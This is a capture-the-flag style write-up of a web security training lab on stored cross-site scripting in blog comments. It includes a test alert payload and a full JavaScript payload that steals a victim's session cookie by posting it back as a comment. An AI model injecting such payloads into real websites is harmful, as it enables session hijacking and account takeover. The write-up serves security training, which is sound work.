# Exploiting Cross-Site Scripting to steal Cookies

## Description
This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

 To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie. 

## Solve

- For this challenge, I first verified the XSS usring the payload `<script>alert('XSS')</script>` in the comments section. Once confirmed, I set on to construct the main script that would give me the victim user's session cookie.
- Final Script:

```javascript
<script>
    window.addEventListener('DOMContentLoaded', function(){

    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();

    data.append('csrf', token);
    data.append('postId', 8);
    data.append('comment', document.cookie);
    data.append('name', 'victim');
    data.append('email', 'hi@mail.com');
    data.append('website', 'http://www.hello.com');

    fetch('/post/comment', {
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
});
</script>
```

- In the above script, we can just change the postId as required and use it to get the session cookie through the comment section.

## References
1. [Exploiting Cross-site Scripting to Steal Cookies Without Collaborator](https://www.youtube.com/watch?v=N_87S9XVy0w&list=PLWvfB8dRFqbZG5cw2OrnEmzSzorxRuxFV&index=22)
2. [Exploiting cross-site scripting to steal cookies without burpsuite collaborator - Lab#22 ](https://www.youtube.com/watch?v=KGRwfb60Rdk)